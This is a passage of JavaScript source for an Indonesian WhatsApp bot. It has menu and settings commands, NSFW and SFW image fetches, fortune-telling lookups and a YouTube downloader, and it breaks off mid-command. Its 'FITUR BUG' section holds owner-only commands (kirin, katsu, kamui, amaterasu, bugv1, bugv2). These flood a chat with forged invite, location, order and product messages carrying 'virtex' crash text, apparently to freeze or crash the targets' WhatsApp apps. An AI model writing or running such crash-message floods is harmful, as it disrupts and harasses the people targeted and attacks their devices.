costum(`*Loading...*`)
sendButImage(from, menunya, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/allmenu.jpg'), woker, {thumbnail: thumb, fileLength: 999999999999 })
}
break
	
	case 'ujian':
	menunya = hentong.ahah(prefix, pushname)
 buyok = [{"buttonId": `INFO BOTZ`,"buttonText": {"displayText": `ɪɴғᴏ ʙᴏᴛᴢ`},"type": "RESPONSE"},
                       {"buttonId": `SEWA BOTZ`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]
	sendButGif(from, menunya, "Halo", buyok) 
	break
	
case 'menu':
case 'help':   
try{
stod = `${sender}`
menunya = help.menu(dateIslamic, thisHit ,listcmdblock, explain, kyun, process, timeWit, timeWita, timeWib, multi, fs, isPremium, getLimit, limitCount, getBalance, senderNumber, blocked, ban, listerror, user, autosticker, forwarding, fake,autoread, autovn, typing, Antibuggc,antibugtroli,Toxic, isAntihidetag, isKickarea, isAntiLink, AntiVirtex, isAntiviewonce, hitnya, pushname, ucapanWaktu, prefix, publik, week, weton, calender)
let mok = [{"buttonId": `INFO BOTZ`,"buttonText": {"displayText": `ɪɴғᴏ ʙᴏᴛᴢ`},"type": "RESPONSE"},
                    {"buttonId": `SEWA BOTZ`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]
options = {contextInfo: { forward, externalAdReply:{title: `${ucapanWaktu} kak`,previewType:"PHOTO",thumbnail: thumb, sourceUrl:"https://youtu.be/_IlvsY7S7j8"}}}  
options1 = { thumbnail: thumb, fileLength: 999999999999, contextInfo: forward}
if(setmenu === "katalog") {
costum(`*Loading...*`)
sendKatalog(menunya)
}  else if(setmenu === "troli") {
sendTroli(menunya)
}else  if(setmenu === "document") {
costum(`*Loading...*`)
Sendbutdocument(from, menunya,`Baterai : ${baterai.battery}\n© ${fake1}`,fs.readFileSync('./stik/thumbnaildokumen.jpg'), mok, options)
} else  if(setmenu === "lokasi") {
costum(`*Loading...*`)
sendButLocation(from, menunya, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/thumb.jpeg'), mok, {contextInfo: forward})
} else  if(setmenu === "gif") {
costum(`*Loading...*`)
sendGif(fs.readFileSync('./stik/video.mp4'), menunya + `\n\nBaterai : ${baterai.battery}\n© ${fake1}`)
} else if(setmenu === "image") {
costum(`*Loading...*`)
sendButImage(from, menunya, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/thumb.jpeg'), mok, options)
}
} catch(err) {
sendMess(err)
sendTroli(menunya)
}
break
	
	
	

	
	
        case 'setmenu':
	if(!isOwner) return
	if ((args[0]) === 'katalog'|| (args[0]) === 'product' ){
		setmenu = "katalog"
		await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
		} else if ((args[0]) === 'image'|| (args[0]) === 'foto' ){
		setmenu = "image"
		await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
		} else if ((args[0]) === 'lokasi' ){
		setmenu = "lokasi"
		await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
		} else if ((args[0]) === 'troli' ){
		setmenu = "troli"
		await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
		}else if ((args[0]) === 'pptx'){
		docType = "pptx"
		setmenu = "document"
		await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
		} else if ((args[0]) === 'xlsx'){
		docType = "xlsx"
		setmenu = "document"
		await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
	} else if ((args[0]) === 'zip'){
		docType = "zip"
		setmenu = "document"
		await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
		} else if ((args[0]) === 'pdf'){
		docType = "pdf"
		setmenu = "document"
		await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
	} else  if ((args[0]) === 'gif'){
		setmenu = "gif"
		await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
	}  else if (!q) {
                      sendButMessage(from, `SETTING MENU\n1.Katalog\n2.Troli\n3.Lokasi\n4.Pptx\n5.Xlsx\n6.Zip\n7.Pdf\n8.Docx`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}setmenu katalog`, buttonText: {displayText: `ᴋᴀᴛᴀʟᴏɢ`},type: 1},
                      {buttonId: `${prefix}setmenu troli`, buttonText: {displayText: `ᴛʀᴏʟɪ`},type: 1},
                      {buttonId: `${prefix}setmenu lokasi`, buttonText: { displayText: `ʟᴏᴋᴀsɪ`},type: 1}]);
                    } else {
                    setReply("Menu tidak di temukan om")
                    }
	break
        



        





case 'setquoted':
	if(!isOwner) return onlyOwner()
	if ((args[0]) === 'ftoko'|| (args[0]) === 'product' ){
		if(Qoted === "ftoko") return setReply("Udah aktif")
		Qoted = "ftoko"
		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: ftoko})
		} else if ((args[0]) === 'fkontak' ){
		if(Qoted === "fkontak") return setReply("Udah aktif")
		Qoted = "fkontak"
		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: fkontak})
		} else if ((args[0]) === 'ftext'){
		if(Qoted === "ftext") return setReply("Udah aktif")
		Qoted = "ftext"
		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: ftext})
		} else if ((args[0]) === 'ftroli'){
		if(Qoted === "ftroli") return setReply("Udah aktif")
		Qoted = "ftroli"
		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: ftroli})
		}else if ((args[0]) === 'fsticker' ){
		if(Qoted === "fsticker") return setReply("Udah aktif")
		Qoted = "fsticker"
		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: fsticker})
		} else if ((args[0]) === 'fvn'){
		if(Qoted === "fvn") return setReply("Udah aktif")
		Qoted = "fvn"
		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: fvn})
		} else if ((args[0]) === 'floc'){
		if(Qoted === "floc") return setReply("Udah aktif")
		Qoted = "floc"
		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: floc})
		} else if ((args[0]) === 'fvideo' ){
		if(Qoted === "fvideo") return setReply("Udah aktif")
		Qoted = "fvideo"
		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: fvideo})
		} else if ((args[0]) === 'fgc'){
		if(Qoted === "fgc") return setReply("Udah aktif")
		Qoted = "fgc"
		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: fgc})
		} else if ((args[0]) === 'fgif'){
		if(Qoted === "fgif") return setReply("Udah aktif")
		Qoted = "fgif"
		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: fgif})
		}else if ((args[0]) === 'fimage'){
		if(Qoted === "fimage") return setReply("Udah aktif")
		Qoted = "fimage"
		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: fimage})
		} else if ((args[0]) === 'dev'){
		if(Qoted === "dev") return setReply("Udah aktif")
		Qoted = "dev"
		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: dev})
		} else if (!q) {
        sendButMessage(from, `SETTING QUOTED`, `Silahkan pilih salah satu`, [
        {buttonId: `${prefix}setquoted ftoko`, buttonText: {displayText: `ғᴛᴏᴋᴏ`},type: 1},
        {buttonId: `${prefix}setquoted fkontak`, buttonText: {displayText: `ғᴋᴏɴᴛᴀᴋ`},type: 1},
        {buttonId: `${prefix}setquoted ftext`, buttonText: { displayText: `ғᴛᴇxᴛ`},type: 1}]);
         } else {
 teks =`Quoted yang kamu masukan salah\nSilakan pilih salah satu quoted berikut:\n1.ftoko\n2.fkontak\n3.ftext\n4.ftroli\n5.fsticker\n6.fvn\n7.floc\n8.fvideo\n9.fgc\n10.fgif\n11.fimage\n12.dev`
 setReply(teks)
 }
	break



case 'setreply':
if(!isOwner) return onlyOwner()
if ((args[0]) === 'web'|| (args[0]) === 'situs' ){
if(setWeb) return setReply("Udah aktif")
setWeb = true
setTroli = false
setMessage = false
setVideo = false
setReply(`Berhasil mengubah set reply ke ${q}`)
} else if ((args[0]) === 'troli' ){
if(setTroli) return setReply("Udah aktif")
setWeb = false
setTroli = true
setMessage = false
setVideo = false
setReply(`Berhasil mengubah set reply ke ${q}`)
} else if ((args[0]) === 'mess'){
if(setMessage) return setReply("Udah aktif")
setWeb = false
setTroli = false
setMessage = true
setVideo = false
setReply(`Berhasil mengubah set reply ke ${q}`)
} else if ((args[0]) === 'vidio'|| (args[0]) === 'video' ){
if(setVideo) return setReply("Udah aktif")
setWeb = false
setTroli = false
setMessage = false
setVideo = true
setReply(`Berhasil mengubah set reply ke ${q}`)
} else if (!q) {
sendButMessage(from, `SETTING REPLY`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}setreply web`, buttonText: {displayText: `ᴡᴇʙ`},type: 1},
{buttonId: `${prefix}setreply troli`, buttonText: {displayText: `ᴛʀᴏʟɪ`},type: 1},
{buttonId: `${prefix}setreply mess`, buttonText: { displayText: `ᴍᴇss`},type: 1}]);
 } 
break







  
	case 'setbc':
	if(!isOwner) return onlyOwner()
	if ((args[0]) === 'troli'|| (args[0]) === 'product' ){
		if(bcTroli) return setReply("Udah aktif")
		bcTroli = true
        bcLokasi = false
        bcDokumen = false   
		await xdev.sendMessage(from,"Berhasil mengubah broadcast ke troli", text, {quoted: setQuoted})
		} else if ((args[0]) === 'lokasi' ){
		if(bcLokasi) return setReply("Udah aktif")
		bcTroli = false
        bcLokasi = true
        bcDokumen = false   
		await xdev.sendMessage(from,"Berhasil mengubah broadcast ke lokasi", text, {quoted: setQuoted})
		} else if ((args[0]) === 'document' || (args[0]) === 'pdf' || (args[0]) === 'dokumen' || (args[0]) === 'ori'){
		if(bcDokumen) return setReply("Udah aktif")
		bcTroli = false
        bcLokasi = false
        bcDokumen = true   
		await xdev.sendMessage(from,"Berhasil mengubah broadcast ke dokumen", text, {quoted: setQuoted})
		} else if (!q) {
                      sendButMessage(from, `SETTING BROADCAST`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}setbc pdf`, buttonText: {displayText: `ᴅᴏᴋᴜᴍᴇɴ`},type: 1},
                      {buttonId: `${prefix}setbc troli`, buttonText: {displayText: `ᴛʀᴏʟɪ`},type: 1},
                      {buttonId: `${prefix}setbc lokasi`, buttonText: { displayText: `ʟᴏᴋᴀsɪ`},type: 1}]);
                    }
	break
	
	
	
		
	
	
	
	 

	
	
	                case 'neko':
					case 'waifu':
					case 'trap':
					case 'blowjob':
					
					if (!checkDataId ("nsfw", from, DataId)  && isGroup) return setReply("Fitur nsfw blom aktif")
					if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					setReply(mess.wait)
					ana = await fetchJson(`https://api.waifu.pics/nsfw/${command}`)
                    sendMediaURL(from, ana.url, 'Done!')
                    limitAdd(senderNumber, user)
					break
					
					case 'yuri':
					case 'kiss':
					case 'cum':
					case 'futanari':
					case 'hentai':
					case 'eroyuri':
					case 'eron':
					case 'erok':
					case 'ero':
					case 'solo':
					case 'erokemo':
					case 'fox_girl':
					case 'feet':
					case 'les':
					case 'feed':
					case 'bj':
					if (!checkDataId ("nsfw", from, DataId)  && isGroup) return setReply("Fitur nsfw blom aktif")
					if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					setReply(mess.wait)
					ana = await fetchJson(`https://nekos.life/api/v2/img/${command}`)
					sendMediaURL(from, ana.url, 'Done!')
                    limitAdd(senderNumber, user)
					break
				
				     
                     case 'neko':
                     case 'shinobu':
                     case 'megumin':
				     case 'bully':
                     case 'cuddle':
                     case 'cry':
                     case 'hug':
				     case 'awoo':
                     case 'kiss':
                     case 'lick':
                     case 'pat':
				     case 'smug':
                     case 'bonk':
                     case 'yeet':
                     case 'blush':
				     case 'smile':
                     case 'wave':
                     case 'highfive':
                     case 'handhold':
				     case 'nom':
                     case 'bite':
                     case 'glomp':
                     case 'slap':
				     case 'kill':
                     case 'happy':
                     case 'wink':
					setReply(mess.wait)
					if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					ana = await fetchJson(`https://api.waifu.pics/sfw/${command}`)
					sendMediaURL(from, ana.url, 'Done!')
                    limitAdd(senderNumber, user)
					break
					
					case 'waifunime':
					setReply(mess.wait)
					if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					ana = await fetchJson(`https://api.waifu.pics/sfw/waifu`)
                    sendMediaURL(from, ana.url, 'Done!')
                    limitAdd(senderNumber, user)
					break
					
					
					
					
					case 'baka':
					case 'hug':
					case 'kemonomimi':
					case 'holo':
					setReply(mess.wait)
					if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					ana = await fetchJson(`https://nekos.life/api/v2/img/${command}`)
                    sendMediaURL(from, ana.url, 'Done!')
                    limitAdd(senderNumber, user)
					break
				
	
	
	//PRIMBON
	case 'artinama':
	try{
	if(!q) return setReply("Namanya apa kak ?")
	primbon.artiNama(q).then(res => {
    setReply(res)
})
} catch (err) {
console.log(err)
setReply("Bjeer error, coba lagi dong 😋")
}
break



case 'artimimpi':
try{
if(!q) return setReply("Mimpi apa semalem ?")
primbon.tafsirMimpi(q).then(res => {
    setReply(res)
})
} catch (err) {
console.log(err)
setReply("Bjeer error, coba lagi dong 😋")
}
break


case 'namapasangan':
try{
if(!q) return setReply("Namanya siapa kak ? Contoh jajas titin")
if(args.length < 2) return setReply("Masukan nama pasangan Contoh jajas titin")
if(args.length > 2) return setReply("Masukan nama pasangan Contoh jajas titin")
primbon.Jodoh(args[0],args[1]).then(res => {
    setReply(res)
})
} catch (err) {
console.log(err)
setReply("Bjeer error, coba lagi dong 😋")
}
break

case 'tanggaljadian':
try{
if(!q) return setReply("Tanggal berapa kak ? Contoh 01-07-2000")
primbon.tanggaljadi(q).then(res => {
    setReply(res)
})
} catch (err) {
console.log(err)
setReply("Bjeer error, coba lagi dong 😋")
}
break

case 'tipewatak':
try{
if(!q) return setReply("Teksnya ? Contoh nih Michelle Ziudith 20-1-1995")
if(args.length < 2) return setReply("Masukan Teksnya Contoh nih Michelle  20-1-1995")
if(args.length > 2) return setReply("Masukan Teksnya Contoh nih Michelle  20-1-1995")
primbon.watakartis(args[0], args[1]).then(res => {
    setReply(res)
})
} catch (err) {
console.log(err)
setReply("Bjeer error, coba lagi dong 😋")
}
break

case 'ramalanjodoh':
try{
if(!q) return setReply(" Teksnya ? Contoh nih joe 11-4-2003 putri 1-2-2005")
if(args.length < 4) return setReply("Masukan Teksnya Contoh nih joe 11-4-2003 putri 1-2-2005")
if(args.length > 4) return setReply("Masukan Teksnya Contoh nih joe 11-4-2003 putri 1-2-2005")
primbon.ramalanjodoh(args[0], args[1], args[2],args[3]).then(res => {
    setReply(res)
})
} catch (err) {
console.log(err)
setReply("Bjeer error, coba lagi dong 😋")
}
break

case 'ramalanrejeki':
try{
if(!q) return setReply("Tanggalnya mana kak Contoh 11-1-2000")
primbon.rejekiweton(q).then(res => {
    setReply(res)
})
} catch (err) {
console.log(err)
setReply("Bjeer error, coba lagi dong 😋")
}
break


case 'kecocokannama':
try{
if(!q) return setReply("Tanggalny mana kak Contoh angel 18-5-20005")
if(args.length < 2) return setReply("Masukan Tanggalny Contoh angel 18-5-20005")
if(args.length > 2) return setReply("Masukan Tanggalny Contoh angel 18-5-20005")
primbon.kecocokannama(args[0], args[1]).then(res => {
    setReply(res)
})
} catch (err) {
console.log(err)
setReply("Bjeer error, coba lagi dong 😋")
}
break

case 'haribaik':
try{
if(!q) return setReply("Tanggalnya mana kak Contoh 1-1-2000")
primbon.haribaik(q).then(res => {
    setReply(res)
})
} catch (err) {
console.log(err)
setReply("Bjeer error, coba lagi dong 😋")
}
break



case 'harilarangan':
try{
if(!q) return setReply("Tanggal nya mana kak Contoh 1-1-2000")
primbon.harilarangan(q).then(res => {
    setReply(res)
})
} catch (err) {
console.log(err)
setReply("Bjeer error, coba lagi dong 😋")
}
break








	
	
	
	
      
           
           
           
	
	
	
        
        
        
        
        
        
        
	
	
	
	
	
	
	
	
  
  case 'play':      
  if(!q) return setReply("Teksnya mana om")
          setReply(mess.wait)
res = await yts(q)
 rus = await y2mateA(`${res.all[0].url}`)
 ras = await y2mateV(`${res.all[0].url}`)
 imagenya = await getBuffer(rus[0].thumb)
 
 views = res.all[0].views
 let okiu = `    
Judul : ${res.all[0].title}
Ditonton : ${h2k(views)} Kali
Durasi : ${res.all[0].timestamp}
File Audio : ${rus[0].size}
File Video : ${ras[0].size}`
									let aklo = [{
										"buttonId": `${prefix}playmp3 ${res.all[0].url}`,
										"buttonText": {
											"displayText": `ᴀᴜᴅɪᴏ`
											},
										"type": "RESPONSE"
										},{
										"buttonId": `${prefix}playmp4 ${res.all[0].url}`,
										"buttonText": {
											"displayText": `ᴠɪᴅɪᴏ`
											},
										"type": "RESPONSE"
										}]
										sendButLocation(from,`*YOUTUBE DOWNLOADER*\n${okiu}`, `© ${fake1}`, imagenya, aklo, {contextInfo: forward})
										break
										 
  
  
  
  
  case 'playmp3':
  try{
if(!q) return setReply("Masukan link vidio youtube kak")
               setReply('*Downloading...*')
               res = await y2mateA(q).catch(e => {
               setReply('_[ ! ] Error Saat Memasuki Web Y2mate_')
               })
               if(res[0].size.includes("MB")){
               filesize =`${res[0].size.split(".")[0]}`
               if(Number(filesize) > 15 ) return setReply(`Bjir sizenya ${res[0].size}\nAu ah ga mao download 😤`)
               }
              //sendFileFromUrl(res[0].link, audio, {quoted: dev, mimetype: 'audio/mp4', filename: res[0].output})
              downloadMp3(q)
           //  await xdev.sendMessage(from, { url : res[0].link }, audio, {quoted: dev, mimetype: 'audio/mp4', filename: res[0].output})
              } catch (err) {
              setReply(err)
              }
               break
           
  
  
  
  case 'playmp4':
            if (!q) return setReply('Link youtubenya mana kak ?')
            setReply('*Downloading...*')
            res = await y2mateV(q).catch(e => {
            setReply('_[ ! ] Error Gagal Memasuki Web Y2mate_')
            })      
            if(res[0].size.includes("MB")){
            filesize =`${res[0].size.split(".")[0]}`
            if(Number(filesize) > 45 ) return setReply(`Bjir sizenya ${res[0].size}\nAu ah ga mao download 😤`)
            }
           // sendFileFromUrl(res[0].link, video, {quoted: dev, mimetype: 'video/mp4', filename: res[0].output})
           downloadMp4(q)
            break
  
  
  
                    case 'readmore':
			    	case 'more':
			    	const more = String.fromCharCode(8206)
			    	const readmore = more.repeat(4001)
				    if (!q.includes('|')) return  setReply("Penggunaan teks| teks")
                    const text1 = q.substring(0, q.indexOf('|') - 0)
                    const text2 = q.substring(q.lastIndexOf('|') + 1)
                    setReply( text1 + readmore + text2)
                    break
  
  
  
  
  
 
  
  


  

	
	
	
	
//-------------------------------》FITUR BUG《-------------------------------\\
	
case 'kirin':
      if(isExtream) return
           if (!isOwner) return onlyOwner()
                        if (args.length < 1) return reply ('jumlahnya berapa kak')
				 for (let i = 0; i < args[0]; i++) {
           xdev.sendMessage(from, {
                        'groupName': fake,
                        'groupJid': '6285156137901-1627579259@g.us',
                        'inviteCode': 'JUJkLCf4mRF0oBuAlwEhO6',
                        'inviteExpiration': '0',
                        'caption': virtex7(prefix),
                        'jpegThumbnail': davizin,
                    }, MessageType.groupInviteMessage, { contextInfo: forward
                    })        
           }
           break
 
 
 
 case 'katsu':
      if(isExtream) return
           if (!isOwner) return onlyOwner()
                        if (args.length < 1) return reply ('jumlahnya berapa kak')
				 for (let i = 0; i < args[0]; i++) {
           xdev.sendMessage(from, {
                            degreesLatitude: 36.036105801662316,
                              degreesLongitude: 138.09072320256624,
                            name: virtex7(prefix),
                               address: virtex6(prefix),
                             jpegThumbnail: virgam,
                              }, location,
                              {contextInfo: forward})
                             
           }
           break
           
           
           case 'kamui':
                if(isExtream) return
           if (!isOwner) return onlyOwner()
                        if (args.length < 1) return reply ('jumlahnya berapa kak')
				 for (let i = 0; i < args[0]; i++) {
           var kirin = xdev.prepareMessageFromContent(from, {
        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": virgam,
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                            }
                      }, {
              contextInfo: forward
                });
                 xdev.relayWAMessage(kirin)
                             
           }
           break
 
 
 
 
	
	
	case 'amaterasu':
     if(isExtream) return
      if (!isOwner) return onlyOwner()
{
var kirim = xdev.prepareMessageFromContent(from, {
                    'orderMessage': {
                        'orderId': '0@s.whatsapp.net',
                        'thumbnail': virgam,
                        'itemCount': jumlahTroli,
                        'status': 1,
                        'surface': 1,
                        'message': philip(prefix),
                        'orderTitle': fake,
                        'sellerJid': `0@s.whatsapp.net`,
                      'token': 'ydkskyshj755hfuej',
                    }
                }, {
              contextInfo: {forwardingScore: 100000000, isForwarded: true, sendEphemeral: true}
                });
                 xdev.relayWAMessage(kirim)
                 
                 
                 
         xdev.sendMessage(from, virtex8(prefix), text,  {
                    'quoted': {
                        'key': {
                            'fromMe': false,
                            'participant': `0@s.whatsapp.net`,
                            'remoteJid': "0@s.whatsapp.net"
                        },
                        'message': {
                            'orderMessage': {
                                'itemCount': jumlahTroli,
                                'status': 1,
                                'surface': 1,
                                'message': 'NOPE',
                                'orderTitle': 'halo gaes',
                               'thumbnail': virgam,
                                'sellerJid': "0@s.whatsapp.net"
                            }
                        }
                    },
                    'contextInfo': {'forwardingScore': 100000000, 'isForwarded': true, 'sendEphemeral': true}
                })
                
                
                xdev.sendMessage(from, {
                        'groupName': virtex8(prefix),
                        'groupJid': '6285156137901-1627579259@g.us',
                        'inviteCode': 'JUJkLCf4mRF0oBuAlwEhO6',
                        'inviteExpiration': '0',
                        'caption': virtex7(prefix),
                        'jpegThumbnail': davizin,
                    }, MessageType.groupInviteMessage, { contextInfo: {forwardingScore: 100000000, isForwarded: true, sendEphemeral: true}
                    })        
                
                
                xdev.sendMessage(from, {
                            degreesLatitude: 36.036105801662316,
                              degreesLongitude: 138.09072320256624,
                            name: virtex7(prefix),
                               address: virtex6(prefix),
                             jpegThumbnail: virgam,
                              }, location,
                              {contextInfo: {forwardingScore: 100000000, isForwarded: true}})
                             
                             hmm4 = fs.readFileSync('./stik/fake.jpeg'),
               imeu = await xdev.prepareMessage( '0@s.whatsapp.net', hmm4, image, { thumbnail : davizin}), 
                imeg = imeu.message.imageMessage
                   res = await xdev.prepareMessageFromContent(from, {
                        'productMessage': {
                            'product': {
                           'productImage': imeg,
                                'productId': '',
                                'title': virtex8(prefix),
                                'description': virtex8(prefix),
                                'priceAmount1000': '1000',
                                'descriptionCount': 1,
                                'productImageCount': '1'
                            },
                            'businessOwnerJid': `0@s.whatsapp.net`,
                            'contextInfo': {
                                'forwardingScore': 100000000,
                                'isForwarded': true,
                                'sendEphemeral': true
                            }
                        }
                    }, {
                  contextInfo: {forwardingScore: 100000000, isForwarded: true, sendEphemeral: true}
                    }), 
                  xdev.relayWAMessage(res)
                             
                             
                             
                    
                    const nana = fs.readFileSync('./stik/trava.jpg');
                        xdev.sendMessage(from, nana, image, {thumbnail: virgam, contextInfo:{ forwardingScore: 100000000, isForwarded: true}});
                        
                        
                        var kirin = xdev.prepareMessageFromContent(from, {
        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": virgam,
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                            }
                      }, {
              contextInfo: {forwardingScore: 100000000, isForwarded: true, sendEphemeral: true}
                });
                 xdev.relayWAMessage(kirin)
                        
                        
                    
 kok = fs.readFileSync('./lib/amaterasu.mp3')
await xdev.sendMessage(from, kok, audio, {  'quoted': {
                            'key': {
                                'participant':  `0@s.whatsapp.net`,
                                ...'from' ? {
                                    'remoteJid': '0@s.whatsapp.net'
                                } : {}
                            },
                            'message': {
                                'orderMessage': {
                                    'itemCount': jumlahTroli,
                                    'status': 1,
                                    'surface': 1,
                                     'message': 'NOPE',
                                    'orderTitle': fake,
                                    'thumbnail': davizin,
                                    'sellerJid':  '0@s.whatsapp.net'
                                }
                            }
                        }, caption: virtex7(prefix),
                   
                })
             
                }

break
           
           case 'bugv1':
                if(isExtream) return
         if (!isOwner) return onlyOwner()
              {
                var kirim = xdev.prepareMessageFromContent(from, {
                    'orderMessage': {
                        'orderId': '0@s.whatsapp.net',
                        'thumbnail': virgam,
                        'itemCount': jumlahTroli,
                        'status': 1,
                        'surface': 1,
                        'message': virtex7(prefix),
                        'orderTitle': fake,
                        'sellerJid': `0@s.whatsapp.net`,
                      'token': 'ydkskyshj755hfuej',
                    }
                }, {
                    'quoted': {
                        'key': {
                            'fromMe': false,
                            'participant': `0@s.whatsapp.net`,
                            'remoteJid': "0@s.whatsapp.net"
                        },
                        'message': {
                            'orderMessage': {
                                'itemCount': jumlahTroli,
                                'status': 1,
                                'surface': 1,
                                'message': 'NOPE',
                                'orderTitle': 'halo gaes',
                                'sellerJid': "0@s.whatsapp.net"
                            }
                        }
                    },
                    'contextInfo': forward
                });
                 xdev.relayWAMessage(kirim)

                }
                break;
                
             
                case 'bugv2':
                     if(isExtream) return
            if (!isOwner) return onlyOwner()
                             xdev.sendMessage(from, {
                            degreesLatitude: 36.036105801662316,
                              degreesLongitude: 138.09072320256624,
                            name: virtex7(prefix),
                               address: virtex6(prefix),
                             jpegThumbnail: virgam,
                              }, location,
                              {contextInfo:forward})
                            break
                
                
                
                case 'bugv3':
                     if(isExtream) return
                   if (!isOwner) return onlyOwner()
